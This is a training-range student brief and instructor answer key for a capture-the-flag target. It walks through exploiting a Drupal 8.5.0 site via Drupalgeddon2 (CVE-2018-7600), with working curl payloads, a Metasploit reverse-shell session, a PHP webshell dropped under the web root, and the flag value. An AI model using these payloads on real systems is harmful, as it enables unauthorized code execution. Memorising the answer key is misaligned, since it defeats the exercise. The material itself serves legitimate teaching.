# Jacksonville Student Brief

## General Instructions

On this subnet, `.254` is the lab router and is out of bounds.

The following docker containers are available to you as pre-installed tools helpful for the labs. Additional details are in the README.txt file on the Kali desktop.

- JavaChains

## Assigned Subnet

`192.168.15.0/24`

## Objective

From your assigned operations station, discover the host on the assigned subnet, gain appropriate access, and collect the flag.

The flag is obvious once you reach it. It is not intentionally hidden or obfuscated.

## Deliverable

Record the flag value for Jacksonville.

## PCTE range limitations

These limits apply on Persistent Cyber Training Environment (PCTE) ranges used by this Module. Treat the items below as a no-strike list when they exist. Not every item is present on every range or host.

Do not target, block, terminate, or delete range-control artifacts:

- **Network:** `10.0.0.0/8` (range control and instrumentation; do not block or flag that traffic). Routers past the edge-router in grey space. TCP `5672` (AMQP user-emulation on the control subnet), `49998`, and `49999`.
- **Accounts:** `range-admin` / `range_admin`, `range-control`, and `range`. Do not use accounts whose username or password contains `simspace`.
- **User emulation:** do not stop it. Typical paths: `C:\Program Files (x86)\Simspace\` and `C:\Users\<Username>\Simspace`. Scripts: `run-actuation.cmd`, `ueactuation.cmd`.
- **Directories:** `C:\Program Files\Puppet Labs` and the Simspace paths above.
- **Processes:** `java.exe`, `javaw.exe`, `ruby.exe`, `rubyw.exe`, `start.exe`, `chromedriver.exe`, `IEDriverServer.exe`, Metova, Selenium, WebDriver.

# Jacksonville — Instructor Answer Key

## Objective and starting context

Students start on the assigned operations station with only the city codename and subnet `192.168.15.0/24`. They must discover the live host, gain access, and recover the flag. The live instructor walkthrough is in this file.

Do not give students the service name, CVE, or host IP.

## Flag / reference table

|Item|Value|
|---|---|
|City|Jacksonville|
|Assigned subnet|`192.168.15.0/24`|
|Deploy flag key|`T6_FLAG`|
|Default flag|`violet-heron`|
|Flag location on target|`/flag.txt` after access|

Rotate `T6_FLAG` in `environments/pcte_vulnhub_targets/.env` and restart the matching container when the class needs a new value. Grade against the live `.env` value, not only the default in this table.

## Initial situational awareness

Establish ops-station context before touching the assigned subnet. These commands are first-use literacy for this Module: run the full set, then interpret.

```
date -u
hostname
whoami
id
pwd
echo "$SHELL"
uname -a
cat /etc/os-release
who
w
ps aux
ss -tulpen
ss -tunap
ip a
ip -4 route
```

Why this matters:

- `date -u` and `hostname` fix remote time and host identity before any later log or packet evidence.
- `whoami`, `id`, `pwd`, and `echo "$SHELL"` lock user, session, and interpreter context.
- `uname -a` and `/etc/os-release` capture OS/runtime version.
- `who` / `w` and `ps aux` show active users and a process baseline.
- `ss -tulpen` (listeners) and `ss -tunap` (active sockets) give the required TCP+UDP picture.
- `ip -4 route` and `ip route get 192.168.15.10` show that the assigned subnet is already reachable via the default gateway.

Expected findings:

- The student is on the operations station (hostname `ops`), not on the city target. The shell is `zsh`.
- `ip -4 addr` shows the lab-facing address on `eth1` (this deployment: `172.16.123.100/24`). The `eth0` address `10.10.123.100/16` is not the path to this city subnet.
- `ip route get 192.168.15.10` uses the default gateway (this deployment: `via 172.16.123.253 dev eth1 src 172.16.123.100`). Do not add a route via `192.168.100.254`. That next hop does not answer, and a more-specific route would hide the working default path.
- Listening sockets on the ops station are local tooling, not the target. `ss` shows SSH and the local JavaChains listener on `8011/tcp`.

## Instructor live walkthrough

### Objective and starting context

Live instructor demo for the Jacksonville Module (`B02.M06`). Students know only the assigned subnet `192.168.15.0/24`. On this range, `.254` is the lab router on the segment and is out of bounds. Do not open with the product name, CVE, or host IP.

This walkthrough is rewritten onto the `192.168.15.0/24` student-facing range. Example host addresses in later steps use the `.10` (and, where present, `.11`) convention from the shared stack; treat those as discovered values, not pre-briefed facts.

The deploy flag key is `T6_FLAG`. Confirm the live `.env` value before grading.

### Required Tools

- `iproute2` (for `ip route get`. This ops station already has a path, so do not add a static route)
- `nmap` (for host discovery and port scanning)
- `gobuster` (directory enumeration once we know this is a Drupal site)
- `curl` (for web enumeration, exploit delivery, and webshell use)
- `python3` (pretty-print the Drupal AJAX JSON)
- `metasploit-framework` (section 4 automated path via `exploit/unix/webapp/drupal_drupalgeddon2`)

### 1. Network Routing & Host Discovery

At the start of this scenario, we only know the target subnet: `192.168.15.0/24`. The operations station is on `172.16.123.0/24` (`eth1`). The city subnet is reached through the default gateway.

Confirm the path before scanning. `ip route get` prints the next hop and the source address the kernel will use:

```
ip route get 192.168.15.10
```

_Output:_

```
192.168.15.10 via 172.16.123.253 dev eth1 src 172.16.123.100 uid 1000
    cache
```

**Observation:** The subnet is already reachable. The source address is `172.16.123.100`.

**Inference:** Do not run `ip route add 192.168.15.0/24 via 192.168.100.254`. `192.168.100.254` does not answer on this range, and that more-specific route would override the working default path.

With connectivity available, find which addresses on the subnet actually answer. `nmap -sn` is a ping sweep: it checks host up/down and **does not** port-scan. That is cheaper than a full TCP scan of every IP, and we only have a subnet so far — we still need a live host before we care about services.

```
nmap -sn -n 192.168.15.0/24
```

_Why `-n`:_ skip reverse DNS. The ops station resolver (`172.16.123.253`) refuses DNS. Without `-n`, this sweep sits at full CPU and does not print hosts. With `-n`, the same sweep finishes in a few seconds.

_Output excerpt:_

```
Nmap scan report for 192.168.15.10
Host is up.
Nmap scan report for 192.168.15.254
Host is up.
```

**Observation:** Two hosts respond on this subnet. `192.168.15.1` does not.

**Inference:** The student brief marks `.254` as the lab router and out of bounds. Concentrate service enumeration on **192.168.15.10**. The shell later confirms that address is the workload's default gateway.

### 2. Service Enumeration

We have a candidate IP. Next question: **what is listening, and what does it claim to be?** That takes a version scan, not another ping sweep.

```
nmap -Pn -sV -n -p- 192.168.15.10
```

_Why these options:_

- `-Pn` — skip nmap’s host-discovery probes. We already know `192.168.15.10` responded to `-sn`. This also keeps the scan going if the host later ignores ping but still serves TCP.
- `-n` — skip reverse DNS, same reason as the sweep. The resolver still refuses.
- `-sV` — version detection. An open `80/tcp` labeled only `http` is not enough to research; we need the product string (here, **Apache httpd 2.4.25**).
- `-p-` — all 65535 TCP ports, not nmap’s default top 1000. A single missed listener would hide the whole attack surface. On this host the extra cost is small.

_Output excerpt:_

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
```

**Observation:** A single open port — **80/tcp** — Apache httpd 2.4.25.

**Inference:** A conventional web stack. Apache does not name the CMS. Next, read HTTP headers and the page body for application fingerprints.

#### Initial Web Probing

nmap told us HTTP on port 80. Confirm that in the HTTP conversation: **headers first** (what the server admits), then the HTML.

```
curl -s -D - http://192.168.15.10/ -o /tmp/t6-root.html | head -20
```

_Why this `curl`:_

- `-s` — silent; drop the progress meter so the output is just headers/body.
- `-D -` — write response **headers** to stdout (`-` means stdout). That is where `Server`, `X-Powered-By`, and `X-Generator` show up.
- `-o /tmp/t6-root.html` — write the **body** to a file so headers and HTML stay separated.
- `| head -20` — only the first header lines.

_Header excerpt:_

```
HTTP/1.1 200 OK
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.2.3
X-Generator: Drupal 8 (https://www.drupal.org)
```

**Observation:** `X-Generator: Drupal 8` is already in the **headers**. That is the product identity — we have it before we touch the HTML.

**Inference:** Confirm the same generator in the page, and grab the title so we know this is an installed site (not the installer).

```
grep -iE '<title>|Generator|Drupal' /tmp/t6-root.html | head -10
```

_Why these patterns:_ `title` is the site name; `Generator` / `Drupal` match the header we already saw (`X-Generator` and the HTML `<meta name="Generator">`). We are not guessing CMS names — we are confirming the header in the body.

_Body excerpt:_

```
<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
<title>Welcome to LabDrupal | LabDrupal</title>
```

**Observation:** Installed **Drupal 8** site named **LabDrupal**. No redirect to `/core/install.php`.

**Inference:** Drupal 8 is the research lead. We still need a **core version** and an **unauthenticated form**. Generic path enumeration is the next step — not a jump straight to a changelog file.

#### Finding `/core/` and `/user/` (gobuster)

Drupal 8 keeps PHP/core assets under **`/core/`** and account routes under **`/user/`**. Those names are also in ordinary web wordlists, so a directory brute-force should surface them without needing the CVE yet.

```
gobuster dir -u http://192.168.15.10 \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 40 --no-error
```

_`gobuster dir`_ requests `GET /{word}` for each wordlist line. _`-w`_ is the list; Kali’s dirb `common.txt` includes `core`, `user`, `sites`, and similar CMS paths. _`--no-error`_ hides transient connection noise.

_Output excerpt:_

```
/core                 (Status: 301) [Size: 313] [--> http://192.168.15.10/core/]
/sites                (Status: 301) [Size: 314] [--> http://192.168.15.10/sites/]
/user                 (Status: 302) [Size: 368] [--> http://192.168.15.10/user/login]
```

This run also returned `/modules`, `/profiles`, `/themes`, `/index.php`, `/robots.txt`, and `/search`, plus many `403` responses for dotfiles. The paths that matter next are `/core/` and `/user/`.

**Note:** gobuster retrieves inconsistent results, run queries again if not enumerating the `/user/` directory

**Observation:** `/core/` and `/user/` exist. `/user` redirects toward login — so account routes are live.

**Inference:** Follow those two directories. `/core/` is where Drupal 8 keeps its version files. `/user` already redirected to `/user/login`, so the account routes under that prefix are live.

#### `/core/CHANGELOG.txt` — where that path comes from

Gobuster found **`/core/`**, not the changelog itself. A default `common.txt` run often lists `changelog.txt` in **lowercase**. This host is Linux (case-sensitive), and Drupal 8 ships **`core/CHANGELOG.txt`** (capital). A lowercase wordlist miss is expected.

The filename is Drupal layout, not a lucky gobuster hit. Searching from facts we have — `Drupal 8 CHANGELOG.txt` — points at the documented path **`/core/CHANGELOG.txt`** (Drupal 8 moved the changelog off the site root into core). Fetch that file and **read the first lines** for the version; do not stop at `Last-Modified`.

```
curl -sI http://192.168.15.10/core/CHANGELOG.txt
curl -s http://192.168.15.10/core/CHANGELOG.txt | head -n 8
```

_`curl -sI`_ is a HEAD request (headers only) — confirms the file is world-readable before we download it.

_Header excerpt:_

```
HTTP/1.1 200 OK
Last-Modified: Wed, 23 Sep 2026 18:00:58 GMT
Content-Type: text/plain
```

_Body excerpt:_

```
Drupal 8.5.0, 2018-03-07
------------------------
```

**Observation:** The body starts with **Drupal 8.5.0**, dated **2018-03-07**. `Last-Modified` on this image is **2026-09-23**. That is the file timestamp, not the release date. The body line is the version proof.

**Inference:** Searching `Drupal 8.5.0 SA-CORE-2018-002` lands on [SA-CORE-2018-002](https://www.drupal.org/sa-core-2018-002) / **CVE-2018-7600 (Drupalgeddon2)** for 8.5.x before **8.5.1**. The matching Vulhub notes are `vulnhub/drupal/CVE-2018-7600/README.md`.

#### `/user/register` — where that path comes from

Gobuster found **`/user`**. Drupal’s default account routes under that prefix are `/user/login`, `/user/register`, and `/user/password` ([User accounts](https://www.drupal.org/docs/user_guide/en/user-concept.html) — registration is a stock path when the site allows new accounts).

**Why register, not login, for this CVE:** SA-CORE-2018-002 is **Form API** abuse on forms that still process attacker-controlled fields. The widely copied public PoCs — [a2u/CVE-2018-7600](https://github.com/a2u/CVE-2018-7600) `exploit.py`, [Exploit-DB 44449](https://www.exploit-db.com/exploits/44449), Metasploit `drupal_drupalgeddon2`, and the Vulhub README — all POST to the **user registration** AJAX submit because that form is reachable **without** a session. Login would require credentials we do not have. Check Point’s Drupalgeddon2 write-up makes the same choice ([Uncovering Drupalgeddon 2](https://research.checkpoint.com/uncovering-drupalgeddon-2/)).

Confirm the register page is actually served:

```
curl -s http://192.168.15.10/user/register | grep -i '<title>'
```

_Output:_

```
<title>Create new account | LabDrupal</title>
```

**Observation:** `/user/register` is reachable without authentication.

**Candidate selection:** Test Form API render-array injection on that registration AJAX path before chasing authenticated Drupal bugs — we have an unauthenticated form and a pre-8.5.1 core fingerprint.

### 3. Vulnerability Discovery

**What the bug is:** Drupal builds pages from **render arrays** — PHP arrays whose keys starting with `#` (`#type`, `#markup`, `#post_render`, …) tell the theme layer how to render a form element. In vulnerable 8.5.x (before 8.5.1), an unauthenticated POST can inject those privileged keys into a form **before** Drupal sanitizes them. If `#post_render` is set to PHP’s `exec` (or `passthru`) and `#markup` is a command, Drupal runs that command while rendering the AJAX response.

That is Drupalgeddon2 / CVE-2018-7600. We already have the version window and `/user/register`. Next we send the **public detection request**, not a custom invention.

#### Detection request — this is `exploit.py` unrolled

The [a2u](https://github.com/a2u/CVE-2018-7600) PoC is a Python script (`exploit.py`). It does **not** use a different protocol. It builds one HTTP POST and prints the command output from the JSON. The `curl` below is that same POST with the encodings written out so the Form API keys are visible.

`exploit.py` effectively sends:

```
POST /user/register?element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax
Content-Type: application/x-www-form-urlencoded

form_id=user_register_form
_drupal_ajax=1
mail[#post_render][]=exec
mail[#type]=markup
mail[#markup]=id
```

In a URL, `#` starts a fragment and never reaches the server, so the script percent-encodes it as `%23`. Brackets become `%5B` / `%5D`. That is why the curl looks noisy — it is the Python request, not a second undocumented exploit.

- `element_parents=account/mail/%23value` — steer the AJAX renderer into the nested **mail** element (`#value`).
- `ajax_form=1` and `_wrapper_format=drupal_ajax` — ask for a Drupal AJAX JSON response (where command output will appear).
- `mail[#type]=markup` — treat the field as renderable markup.
- `mail[#post_render][]=exec` — run PHP `exec()` on that markup.
- `mail[#markup]=id` — the command. Public PoCs use `id` here; this is already **OS** execution, not a math canary.

`--data` sends the body. `| python3 -m json.tool` pretty-prints the AJAX JSON so the `data` field is readable.

```
curl -s "http://192.168.15.10/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "form_id=user_register_form&_drupal_ajax=1&mail%5B%23post_render%5D%5B%5D=exec&mail%5B%23type%5D=markup&mail%5B%23markup%5D=id" \
  | python3 -m json.tool
```

_Output:_

```
[
    {
        "command": "insert",
        "method": "replaceWith",
        "selector": null,
        "data": "uid=33(www-data) gid=33(www-data) groups=33(www-data)<span class=\"ajax-new-content\"></span>",
        "settings": null
    }
]
```

**Observation:** The AJAX `data` field contains `uid=33(www-data)` — `id` ran as the web user.

**Inference:** Unauthenticated RCE via Drupalgeddon2 is confirmed. Metasploit (section 4) or the same POST with a different `#markup` (section 5) is next.

### 4. Automated Path: Metasploit

Product + confirmed Form API RCE is enough to search Metasploit:

```
msf6 > search drupalgeddon2

Matching Modules
================

   #  Name                                      Disclosure Date  Rank       Check  Description
   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
```

```
msfconsole -q
```

```
msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 192.168.15.10
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RPORT 80
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set TARGETURI /
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set LHOST 172.16.123.100
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set LPORT 4444
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set PAYLOAD php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > check
[*] 192.168.15.10:80 - The target appears to be vulnerable.
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run
```

`LHOST` is the `src` address from `ip route get 192.168.15.10`. Do not use `192.168.100.1`. That address is not on this station.

_Output excerpt:_

```
[*] Started reverse TCP handler on 172.16.123.100:4444
[*] Meterpreter session 1 opened (172.16.123.100:4444 -> 192.168.15.10:35154)
```

The source port changes across runs. The session information line is `www-data @ 795c09933e6c`. That hostname is the container id and changes when the container is recreated.

In the session:

Basic Survey

```
sysinfo
getuid
getpid
pwd
ps
```

Drop into a shell on target for remaining commands. `ss` and `netstat` are not installed. OS `ps`, `w`, and `who` are. `ip r` shows `default via 192.168.15.254`. `/etc/os-release` is Debian 9 (stretch). `pwd` is `/var/www/html`.

```
shell
date -u
w
ip a
ip r
exit
```

Why this matters:

- Gained interactive access to target, check for basic configuration information before proceeding to complete tasks

Retrieve the Flag From the reverse shell:

```
meterpreter >
search -d / -f flag.txt
cat /flag.txt
violet-heron

```

That is a complete automated path to the flag. Section 5 is the same Form API POST without Metasploit.

### 5. Manual Path: Form API webshell

`exploit.py` takes a **command string** and puts it in `mail[#markup]`. The detection curl used `id`. A reverse shell through `exec` is possible but quoting is brittle. On this PHP/Apache host a simpler `#markup` is: write a tiny webshell under the document root, then talk to it over HTTP. That is still the a2u/Vulhub request — only the command changed.

`--data-urlencode` lets us write `mail[#post_render][]` with real `#` characters; curl encodes them. Switch the callback to `passthru` so we get full command output (PHP `exec()` returns only the last line).

The payload `<?php system($_GET["c"]); ?>` base64-encodes to `PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==`. Write it with `php -r` so nested quotes do not corrupt the file. Document root is `/var/www/html` on this Apache image (`www-data` can write there). Drupal’s `sites/default/files` is writable but ships an `.htaccess` that disables PHP execution ([SA-2006-006](https://www.drupal.org/drupal-sa-2006-006)-era hardening) — a `.php` there will not run.

```
curl -s "http://192.168.15.10/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "form_id=user_register_form" \
  --data-urlencode "_drupal_ajax=1" \
  --data-urlencode "mail[#post_render][]=passthru" \
  --data-urlencode "mail[#type]=markup" \
  --data-urlencode 'mail[#markup]=php -r '"'"'$c=base64_decode("PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg=="); file_put_contents("/var/www/html/cmd.php",$c); echo strlen($c);'"'"''
```

_Output excerpt:_ `passthru` prints `28` (byte length of the written webshell) and then the Drupal AJAX JSON. The JSON `data` field is only the empty `<span class="ajax-new-content"></span>`, not the number.

Confirm the shell executes arbitrary commands:

```
curl -s 'http://192.168.15.10/cmd.php?c=id'
```

_Output:_

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Flag via the webshell (or `cat /flag.txt` in the Metasploit session from section 4):

```
curl -s 'http://192.168.15.10/cmd.php?c=cat%20/flag.txt'
```

_Output:_

```
violet-heron
```

If you skip the webshell, the original `exploit.py` shape can print the flag in the AJAX `data` field (`#markup=cat /flag.txt`):

```
curl -s "http://192.168.15.10/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "form_id=user_register_form&_drupal_ajax=1&mail%5B%23post_render%5D%5B%5D=exec&mail%5B%23type%5D=markup&mail%5B%23markup%5D=cat%20/flag.txt" \
  | python3 -m json.tool
```

_Output excerpt:_

```
"data": "violet-heron<span class=\"ajax-new-content\"></span>"
```

Target 6 is complete.

## Troubleshooting / confirmation

- If the subnet does not respond, confirm the stack is up and `ip route get 192.168.15.10` still uses the default gateway. Do not add a route via `192.168.100.254`.
- If `nmap -sn` never prints hosts, rerun it with `-n`.
- If the Metasploit session does not connect, set `LHOST` to the `src` address from `ip route get 192.168.15.10`, not `192.168.100.1`.
- If the recovered string does not match this table, read the live `T6_FLAG` from `.env` before marking the quiz wrong.
- If students name a CVE or product before they have service evidence, redirect them to host discovery and version output.
- The city subnet for this module is `192.168.15.0/24`. The ops-station address can change with DHCP; take `LHOST` from `ip route get`, not from a remembered `172.16.123.100`.

## Grading checkpoints

|Checkpoint|Acceptable evidence|
|---|---|
|Assigned subnet used|Student worked `192.168.15.0/24` (or the live remapped equivalent)|
|Host discovered|Live host identified from a subnet sweep, not from a handed IP|
|Access gained|Command or session evidence that reached the target filesystem|
|Flag submitted|Quiz value matches live `T6_FLAG` (default `violet-heron`)|

Accept a correct live flag even if the student used a valid alternate exploit path. Do not award the quiz for a walkthrough dump without the flag.